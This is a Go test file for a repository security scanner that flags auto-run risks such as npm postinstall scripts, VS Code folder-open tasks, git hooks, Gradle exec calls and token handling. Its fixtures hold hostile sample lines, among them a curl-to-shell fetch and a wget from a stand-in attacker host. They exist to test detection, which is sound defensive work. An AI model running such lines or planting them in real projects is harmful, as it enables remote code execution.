package scan

import (
	"flag"
	"io"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

func TestParseRemoteURL(t *testing.T) {
	cases := []struct {
		in    string
		host  string
		owner string
		repo  string
		clone string
	}{
		{"https://github.com/owner/repo.git", "github.com", "owner", "repo", "https://github.com/owner/repo.git"},
		{"https://github.com/owner/repo", "github.com", "owner", "repo", "https://github.com/owner/repo"},
		{"git@github.com:owner/repo.git", "github.com", "owner", "repo", "git@github.com:owner/repo.git"},
		{"ssh://git@github.com/owner/repo.git", "github.com", "owner", "repo", "ssh://git@github.com/owner/repo.git"},
		{"github.com/owner/repo", "github.com", "owner", "repo", "https://github.com/owner/repo.git"},
		{"owner/repo", "github.com", "owner", "repo", "https://github.com/owner/repo.git"},
		{"https://gitlab.com/group/sub/repo.git", "gitlab.com", "group/sub", "repo", "https://gitlab.com/group/sub/repo.git"},
		// An SSH URL keeps its SSH form. The clone command the report prints has
		// to work as typed, and a GitLab subgroup stays in the owner.
		{"git@github.com:nisrulz/android-spacex-app.git", "github.com", "nisrulz", "android-spacex-app",
			"git@github.com:nisrulz/android-spacex-app.git"},
		{"git@gitlab.com:group/sub/repo.git", "gitlab.com", "group/sub", "repo",
			"git@gitlab.com:group/sub/repo.git"},
	}
	for _, c := range cases {
		got, err := parseRemoteURL(c.in, "", "")
		if err != nil {
			t.Errorf("parseRemoteURL(%q): %v", c.in, err)
			continue
		}
		if got.host != c.host || got.owner != c.owner || got.repo != c.repo {
			t.Errorf("parseRemoteURL(%q) = %s/%s/%s, want %s/%s/%s",
				c.in, got.host, got.owner, got.repo, c.host, c.owner, c.repo)
		}
		if got.clone != c.clone {
			t.Errorf("parseRemoteURL(%q) clone = %q, want %q", c.in, got.clone, c.clone)
		}
	}
}

// TestSSHTargetIsRemoteAndReadable covers the whole shape of an SSH argument:
// it is treated as remote, it parses into parts, and the clone advice keeps SSH
// so the reader can actually run the command the report prints.
func TestSSHTargetIsRemoteAndReadable(t *testing.T) {
	const target = "git@github.com:nisrulz/android-spacex-app.git"

	if !isRemoteArg(target) {
		t.Fatalf("isRemoteArg(%q) = false, want true", target)
	}
	rt, err := parseRemoteURL(target, "main", "")
	if err != nil {
		t.Fatalf("parseRemoteURL: %v", err)
	}
	if rt.host != "github.com" {
		t.Errorf("host = %q, want github.com so the GitHub API source is used", rt.host)
	}
	if rt.display() != "github.com/nisrulz/android-spacex-app (ref: main)" {
		t.Errorf("display = %q", rt.display())
	}
	if rt.clone != target {
		t.Errorf("clone = %q, want the SSH URL unchanged so the advice runs", rt.clone)
	}
	// An SSH URL without a .git suffix still resolves to the same repository.
	if _, err := parseRemoteURL(strings.TrimSuffix(target, ".git"), "", ""); err != nil {
		t.Errorf("parseRemoteURL on the suffix-less form: %v", err)
	}
}

func TestIsRemoteArg(t *testing.T) {
	remote := []string{
		"https://github.com/owner/repo",
		"git@github.com:owner/repo.git",
		"github.com/owner/repo",
		"owner/repo",
	}
	for _, arg := range remote {
		if !isRemoteArg(arg) {
			t.Errorf("isRemoteArg(%q) = false, want true", arg)
		}
	}

	local := t.TempDir()
	if isRemoteArg(local) {
		t.Errorf("isRemoteArg(%q) = true, want false", local)
	}
	if isRemoteArg(filepath.Join(local, "repo")) {
		t.Errorf("isRemoteArg(local subpath) = true, want false")
	}
}

type fakeSource struct {
	files map[string][]byte
	hooks []string
}

func (f fakeSource) file(p string) []byte { return f.files[p] }
func (f fakeSource) hookFiles() []string  { return f.hooks }

func (f fakeSource) reportPath(rel string) string { return remoteReportPath(rel) }

func (f fakeSource) list() []string {
	paths := make([]string, 0, len(f.files))
	for p := range f.files {
		paths = append(paths, p)
	}
	sort.Strings(paths)
	return paths
}

func TestScanRemoteSource(t *testing.T) {
	src := fakeSource{
		files: map[string][]byte{
			".gitattributes":     []byte("*.bin filter=evil\n"),
			"package.json":       []byte(`{"scripts":{"postinstall":"node x.js"}}`),
			".envrc":             []byte("export X=1\n"),
			".vscode/tasks.json": []byte(`{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}`),
		},
		hooks: []string{".husky/pre-commit"},
	}

	var findings []Finding
	scanRemoteSource(src, func(f Finding) { findings = append(findings, f) })

	for _, want := range []string{
		"Attribute binds filter=evil",
		"npm install script: postinstall",
		"direnv file present",
		"VS Code auto-run task",
		"Husky hooks directory present",
		"Tracked hook file: pre-commit",
	} {
		if !hasTitle(findings, want) {
			t.Errorf("missing finding %q in %+v", want, findings)
		}
	}
}

// TestScanRemoteSourceRunsTheSameSurfaceAsALocalScan is the guard for the
// detector gap this closes. The shell and Android checks used to be wired to
// repoLayout and walkTree, so scanRemoteSource never reached them: a ZIP or a
// URL scan reported a tree containing `curl … | sh` as clean while the local scan
// on the same tree called it CRITICAL.
//
// The test runs both paths over one set of files and compares the finding
// titles, so adding a file to one detector and forgetting the other fails here
// rather than quietly reopening the gap.
func TestScanRemoteSourceRunsTheSameSurfaceAsALocalScan(t *testing.T) {
	files := map[string]string{
		// shell
		"setup.sh":         "curl -sL https://evil.example/x.sh | sh\n",
		"scripts/build.sh": "wget https://evil.example/t\n",
		".envrc":           "export PATH=./bin\n",
		"Makefile":         "install:\n\tadb install app.apk\n",
		// android
		"build.gradle.kts":                         "task t { exec { commandLine 'sh', 'x' } }\n",
		"app/build.gradle":                         "storePassword hunter2\n",
		"gradle.properties":                        "storePassword=hunter2\n",
		"local.properties":                         "sdk.dir=/Users/me/Android/Sdk\n",
		"gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https://evil.example/gradle.zip\n",
		"src/main/cpp/CMakeLists.txt":              "execute_process(COMMAND sh x.sh)\n",
		"src/main/jni/Android.mk":                  "LOCAL_LDFLAGS := $(shell id)\n",
		"release.jks":                              "binary",
		".vscode/tasks.json":                       `{"tasks":[{"command":"adb shell am start"}]}`,
		// not a surface file
		"docs/notes.md":          "prose only",
		"src/main/java/App.java": "class App {}",
	}

	root := makeRepo(t, "[core]\n")
	for name, body := range files {
		writeFile(t, filepath.Join(root, filepath.FromSlash(name)), body)
	}
	writeFile(t, filepath.Join(root, ".git", "hooks", "pre-commit"), "#!/bin/sh\n")

	localFindings := scan(t, root)
	local := titleSet(worktreeOnly(localFindings))

	src := fakeSource{
		files: map[string][]byte{".git/hooks/pre-commit": []byte("#!/bin/sh\n")},
		hooks: []string{".git/hooks/pre-commit"},
	}
	for name, body := range files {
		src.files[name] = []byte(body)
	}
	var remote []Finding
	scanRemoteSource(src, func(f Finding) { remote = append(remote, f) })
	remote = worktreeOnly(remote)

	missing := map[string]bool{}
	for title := range local {
		missing[title] = true
	}
	for _, f := range remote {
		delete(missing, f.Title)
	}
	if len(missing) != 0 {
		t.Errorf("the ZIP/URL path missed findings the local scan reported:\n  missing %v\n  local   %v\n  remote  %v",
			keys(missing), keys(local), titles(remote))
	}

	// The two findings that motivated the fix have to be present.
	if !hasTitlePrefix(remote, "Setup script pipes into an interpreter") {
		t.Errorf("the setup script pipe is missing from the ZIP/URL path: %v", titles(remote))
	}
	if !hasTitlePrefix(remote, "Gradle script runs a command") {
		t.Errorf("the Gradle exec is missing from the ZIP/URL path: %v", titles(remote))
	}
}

// worktreeOnly drops the findings that come out of a .git directory. Those are
// the one documented gap between a local scan and a ZIP or URL scan, and they
// arrive by a different mechanism on each path: the local scan lists the hooks
// directory, the remote path reports tracked hook files. Comparing them here
// would test the wrong thing; see the limits table in the README.
func worktreeOnly(findings []Finding) []Finding {
	var out []Finding
	for _, f := range findings {
		slashed := filepath.ToSlash(f.Path)
		if strings.Contains(slashed, "/.git/") || strings.HasPrefix(slashed, ".git/") {
			continue
		}
		out = append(out, f)
	}
	return out
}

func titleSet(findings []Finding) map[string]bool {
	set := map[string]bool{}
	for _, f := range findings {
		set[f.Title] = true
	}
	return set
}

func keys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func TestScanRemoteSourceClean(t *testing.T) {
	src := fakeSource{files: map[string][]byte{}, hooks: nil}
	var findings []Finding
	scanRemoteSource(src, func(f Finding) { findings = append(findings, f) })
	if len(findings) != 0 {
		t.Errorf("want no findings, got %+v", findings)
	}
}

func TestReadFileMissing(t *testing.T) {
	if readFile(filepath.Join(t.TempDir(), "nope")) != nil {
		t.Error("readFile on missing file should return nil")
	}
	data := []byte("x")
	p := filepath.Join(t.TempDir(), "f")
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Fatal(err)
	}
	if string(readFile(p)) != "x" {
		t.Error("readFile returned wrong content")
	}
}

// TestResolveTokenPrefersTheEnvironment checks a token reaches the scan without
// ever passing through argv, where ps and shell history would expose it.
func TestResolveTokenPrefersTheEnvironment(t *testing.T) {
	t.Setenv("GITHUB_TOKEN", "from-github-token")
	t.Setenv("GH_TOKEN", "from-gh-token")

	got, err := resolveToken("")
	if err != nil {
		t.Fatalf("resolveToken: %v", err)
	}
	if got != "from-github-token" {
		t.Errorf("token = %q, want GITHUB_TOKEN to win", got)
	}

	t.Setenv("GITHUB_TOKEN", "")
	got, err = resolveToken("")
	if err != nil {
		t.Fatalf("resolveToken: %v", err)
	}
	if got != "from-gh-token" {
		t.Errorf("token = %q, want the GH_TOKEN fallback", got)
	}

	t.Setenv("GH_TOKEN", "  ")
	got, err = resolveToken("")
	if err != nil {
		t.Fatalf("resolveToken: %v", err)
	}
	if got != "" {
		t.Errorf("token = %q, want empty for a whitespace-only value", got)
	}
}

func TestResolveTokenFromFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "token")
	// A token file usually ends with a newline; it must not become part of the
	// header value.
	writeFile(t, path, "ghp_fromfile\n")

	got, err := resolveToken(path)
	if err != nil {
		t.Fatalf("resolveToken: %v", err)
	}
	if got != "ghp_fromfile" {
		t.Errorf("token = %q, want %q", got, "ghp_fromfile")
	}

	if _, err := resolveToken(filepath.Join(dir, "missing")); err == nil {
		t.Error("resolveToken accepted a missing -token-file")
	}
}

// TestNoTokenFlagExists is the guard for the leak itself: the flag is gone, so
// there is no way to hand a secret to the process through argv.
func TestNoTokenFlagExists(t *testing.T) {
	fs := flag.NewFlagSet("side-eye", flag.ContinueOnError)
	fs.SetOutput(io.Discard)
	registerScanFlags(fs)

	if f := fs.Lookup("token"); f != nil {
		t.Errorf("-token still exists, so a secret can be read from ps: %q", f.Usage)
	}
	if fs.Lookup("token-file") == nil {
		t.Error("-token-file must exist as the file-based replacement")
	}
}
